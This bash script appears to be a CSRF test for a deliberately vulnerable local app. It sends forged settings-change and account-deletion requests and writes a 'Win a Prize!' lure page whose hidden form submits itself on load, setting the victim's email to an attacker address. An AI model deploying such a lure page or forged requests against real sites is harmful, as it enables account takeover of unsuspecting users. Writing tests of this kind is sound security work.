#!/bin/bash

# CSRF Vulnerability Test Script
BASE_URL="http://localhost:5000"

echo "==================================="
echo "CSRF Vulnerability Tests"
echo "==================================="

# Test 1: Settings update without CSRF token
echo -e "\n[TEST 1] Account settings update (no CSRF token)"
curl -X POST "$BASE_URL/account/settings" \
  -d "email=attacker@evil.com&username=pwned" \
  -v

# Test 2: Account deletion
echo -e "\n\n[TEST 2] Account deletion (no CSRF token)"
curl -X POST "$BASE_URL/account/delete" \
  -d "username=victim" \
  -v

# Test 3: Create malicious HTML for CSRF attack
echo -e "\n\n[TEST 3] Creating malicious CSRF HTML..."
cat > /tmp/csrf_attack.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <title>Win a Prize!</title>
</head>
<body>
    <h1>Congratulations! You won!</h1>
    <p>Processing your prize...</p>
    
    <!-- Hidden CSRF attack form -->
    <form id="csrf" method="POST" action="http://localhost:5000/account/settings">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="hidden" name="username" value="hacked">
    </form>
    
    <script>
        // Auto-submit on page load
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
HTMLEOF

echo "Malicious CSRF page created at: /tmp/csrf_attack.html"
echo "Open this file in a browser while logged into VulnApp to test CSRF"

echo -e "\n✅ CSRF tests completed"
